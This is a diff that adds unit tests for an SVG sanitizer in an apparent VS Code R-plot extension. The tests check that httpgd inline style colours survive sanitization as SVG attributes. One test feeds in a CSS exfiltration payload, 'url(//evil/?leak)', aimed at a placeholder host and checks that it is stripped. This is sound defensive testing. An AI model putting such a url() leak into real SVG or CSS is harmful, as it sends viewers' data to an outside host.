@@ -146,6 +146,126 @@ describe('sanitize_svg — malicious content is stripped', () => {
     });
 });
 
+describe('sanitize_svg — httpgd inline style preservation', () => {
+    // httpgd emits colors via inline `style="fill: ...; stroke: ..."`,
+    // NOT via fill=/stroke= attributes. Earlier sanitize.ts stripped
+    // the style attribute wholesale, leaving the rendered SVG painted
+    // with the SVG default values (fill=black, stroke=none) — which on
+    // a dark VS Code editor background is invisible. The "Apply VS Code
+    // theme" overlay was hiding this regression: with the overlay ON,
+    // CSS supplied `--vscode-editor-foreground` via `!important`, so
+    // strokes and text were visible only with the toggle on.
+    //
+    // These tests pin the fix: inline style declarations from httpgd
+    // (presentation properties only — fill, stroke, font, etc.) must
+    // be migrated to proper SVG attributes BEFORE DOMPurify's
+    // FORBID_ATTR strips `style=`.
+    test('inline style fill/stroke survive sanitize as attributes', () => {
+        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
+            + '<circle cx="10" cy="10" r="5" style="stroke: #000000; fill: #FF0000;" />'
+            + '</svg>';
+        const out = sanitize_svg(input);
+        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
+        const circle = dom.window.document.querySelector('circle');
+        expect(circle).not.toBeNull();
+        expect(circle!.getAttribute('fill')).toBe('#FF0000');
+        expect(circle!.getAttribute('stroke')).toBe('#000000');
+        // The raw `style=` attribute itself MUST be gone — preserves
+        // the defense-in-depth against CSS-`url()` exfiltration.
+        expect(circle!.getAttribute('style')).toBeNull();
+    });
+
+    test('a comprehensive httpgd-shaped style is migrated property by property', () => {
+        // Mirror the actual httpgd output shape: text gets font-size,
+        // fill, font-family; rects/circles get stroke, stroke-width,
+        // fill. Single-quoted attribute with embedded double-quoted
+        // value (font-family: "Arial") mirrors the real fixture.
+        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
+            + '<rect width="100%" height="100%" style="stroke: none; fill: #FFFFFF;" />'
+            + "<text x='10' y='20' style='font-size: 9.13px; fill: #4D4D4D; font-family: \"Arial\";'>label</text>"
+            + '</svg>';
+        const out = sanitize_svg(input);
+        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
+        const rect = dom.window.document.querySelector('rect');
+        const text = dom.window.document.querySelector('text');
+        expect(rect!.getAttribute('fill')).toBe('#FFFFFF');
+        expect(rect!.getAttribute('stroke')).toBe('none');
+        expect(text!.getAttribute('fill')).toBe('#4D4D4D');
+        expect(text!.getAttribute('font-size')).toBe('9.13px');
+        // Font-family value retains its CSS-style quotes — SVG accepts
+        // them; this preserves the family name fidelity httpgd emits.
+        expect(text!.getAttribute('font-family')).toBe('"Arial"');
+    });
+
+    test('httpgd fixture renders with visible paint after sanitization', async () => {
+        // End-to-end against the checked-in fixture: every <circle>
+        // in the plot data has either a fill or a stroke that is NOT
+        // the SVG default ("none"/black), so the plot is visible in
+        // any theme — proving the toggle-off rendering path works.
+        const { readFileSync } = await import('node:fs');
+        const { resolve } = await import('node:path');
+        const fixturePath = resolve(
+            // import.meta.dir at runtime is the directory of this test
+            // file, so `..` reaches the repo's tests/ directory.
+            (import.meta as unknown as { dir: string }).dir,
+            '..',
+            'fixtures',
+            'httpgd',
+            'plot-1-10.svg',
+        );
+        const fixture = readFileSync(fixturePath, 'utf-8');
+        const out = sanitize_svg(fixture);
+        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
+        const firstRect = dom.window.document.querySelector('svg > rect');
+        expect(firstRect).not.toBeNull();
+        // The canvas-rect's fill is httpgd's bg parameter (#FFFFFF) —
+        // load-bearing for toggle-OFF rendering (white background).
+        expect(firstRect!.getAttribute('fill')).toBe('#FFFFFF');
+        const circles = dom.window.document.querySelectorAll('circle');
+        expect(circles.length).toBeGreaterThan(0);
+        for (const c of circles) {
+            const stroke = c.getAttribute('stroke');
+            const fill = c.getAttribute('fill');
+            const hasVisiblePaint =
+                (stroke !== null && stroke !== '' && stroke !== 'none')
+                || (fill !== null && fill !== '' && fill !== 'none');
+            expect(hasVisiblePaint).toBe(true);
+        }
+    });
+
+    test('inline style with url(...) is dropped, safe declarations preserved', () => {
+        // CSS exfiltration defense: a malicious R user emitting
+        // `style="fill: #fff; background: url(//evil/?leak)"` must NOT
+        // produce a `url(` token anywhere in the sanitized output.
+        // The safe `fill` declaration is preserved as `fill="#fff"`.
+        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
+            + '<rect style="fill: #ffffff; background: url(//evil/?leak);" />'
+            + '</svg>';
+        const out = sanitize_svg(input);
+        expect(out.toLowerCase()).not.toContain('url(');
+        expect(out).not.toContain('evil');
+        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
+        const rect = dom.window.document.querySelector('rect');
+        expect(rect!.getAttribute('fill')).toBe('#ffffff');
+        expect(rect!.getAttribute('style')).toBeNull();
+    });
+
+    test('unrecognized style properties are dropped, not migrated', () => {
+        // `background` is not an SVG presentation attribute and isn't
+        // in the safe-property allowlist; it must not survive as a
+        // background= attribute (which is meaningless) or a style=.
+        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
+            + '<rect style="fill: #fff; background-color: red;" />'
+            + '</svg>';
+        const out = sanitize_svg(input);
+        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
+        const rect = dom.window.document.querySelector('rect');
+        expect(rect!.getAttribute('fill')).toBe('#fff');
+        expect(rect!.getAttribute('background-color')).toBeNull();
+        expect(rect!.getAttribute('style')).toBeNull();
+    });
+});
+
 describe('sanitize_svg — robustness', () => {
     test('empty input → empty output', () => {
         expect(sanitize_svg('')).toBe('');
